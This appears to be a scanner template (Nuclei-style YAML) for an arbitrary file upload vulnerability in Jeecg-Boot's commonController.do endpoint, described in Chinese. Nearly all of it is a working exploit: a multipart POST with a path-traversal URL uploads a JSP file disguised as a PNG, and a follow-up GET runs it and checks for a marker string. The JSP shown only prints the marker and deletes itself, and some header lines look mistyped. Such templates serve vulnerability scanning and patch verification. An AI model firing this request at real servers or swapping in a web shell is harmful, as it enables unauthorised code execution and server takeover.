id: jeecg-commonController-upload
info:
  name: Jeecg commonController 任意文件上传漏洞
  author: apple
  severity: critical
  description: eecg-Boot快速开发平台，可以应用在任何J2EE项目的开发中，尤其适合企业信息管理系统（MIS）、内部办公系统（OA）、企业资源计划系统（ERP）、客户关系管理系统（CRM）等，其半智能手工Merge的开发方式，可以显著提高开发效率70%以上，极大降低开发成本。其commonController.do接口存在任意文件上传漏洞，可悲攻击者上传恶意脚本，导致服务器被控。
  reference:
    - https://mp.weixin.qq.com/s/kLJLXc_tn1mrClweaX2bkw
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - raw:
      - |-
        POST /api/../commonController.do?parserXml HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Content-Length: 463
        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
        Connection: close

        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; "name="name"

        zW9YCa.png
        ------WebKitFormBoundarygcflwtei
        ontent-Disposition: form-data; name="documentTitle"

        blank
        ------WebKitFormBoundarygcflwtei
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
        Content-Type: image/png

        <% out.println("whoisceshi");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundarygcflwtei--
      - |+
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
